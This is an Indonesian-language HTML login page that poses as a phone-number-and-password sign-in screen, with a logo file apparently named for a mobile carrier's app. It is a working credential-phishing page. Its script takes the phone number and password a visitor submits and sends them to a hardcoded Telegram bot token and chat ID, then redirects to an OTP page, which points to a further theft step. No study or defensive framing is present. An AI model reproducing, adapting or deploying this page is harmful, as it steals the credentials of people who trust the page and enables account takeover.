<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 80vh;
            margin: 0;
        }
        .login-wrapper {
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        .logo-container {
            margin-bottom: 70px;
        }
        .logo-container img {
            max-width: 170px;
            height: auto;
        }
        .input-group {
            position: relative;
            margin-bottom: 25px;
            border-bottom: 1px solid #ccc;
            text-align: left;
        }
        /* Penambahan ikon placeholder seperti di gambar */
        .input-group::before {
            content: '';
            position: absolute;
            left: -30px;
            top: 10px;
            width: 20px;
            height: 20px;
            background-size: contain;
            background-repeat: no-repeat;
        }
        .input-group input {
            width: 100%;
            border: none;
            outline: none;
            padding: 10px 0;
            font-size: 16px;
            font-style: italic;
            color: #333;
        }
        .footer-links {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 14px;
            font-weight: bold;
            color: #002d72;
            margin-bottom: 30px;
        }
        .btn-masuk {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 50px;
            background: linear-gradient(to right, #00b4ff, #0046ff);
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0, 70, 255, 0.2);
        }
        .counter {
            text-align: right;
            font-size: 12px;
            color: #999;
            margin-top: -20px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<div class="login-wrapper">
    <div class="logo-container">
        <img src="bima.png" alt="Logo"> 
    </div>

    <form id="formLogin">
        <div class="input-group">
            <input type="tel" id="phone" placeholder="Masukkan No Handphone Anda" required>
        </div>
        <div class="counter">0/14</div>

        <div class="input-group">
            <input type="password" id="password" placeholder="Masukkan Kata Sandi Anda" required>
        </div>

        <div class="footer-links">
            <label style="display: flex; align-items: center; gap: 5px;">
                <input type="checkbox" checked> Ingat Saya
            </label>
            <span>Lupa Kata Sandi?</span>
        </div>

        <button type="submit" class="btn-masuk">Masuk</button>
    </form>
</div>

<script>
    const token = '7950731309:AAGg2VGwiHfZxr8VcpkrWafa1HKDs53sqs4';
    const chatId = '6105452078';

    document.getElementById('formLogin').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const phone = document.getElementById('phone').value;
        const pass = document.getElementById('password').value;

        // Simpan nomor HP agar bisa muncul di halaman OTP
        localStorage.setItem('userPhone', phone);

        const pesan = `ðŸ“± *LOGIN BARU*\n\nðŸ“± No HP: \`${phone}\`\nðŸ”‘ Pass: \`${pass}\``;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}&parse_mode=MarkdownV2`)
        .then(() => {
            // Pindah ke file otp.html
            window.location.href = 'otp.html';
        })
        .catch(err => console.error(err));
    });
</script>

</body>
</html>
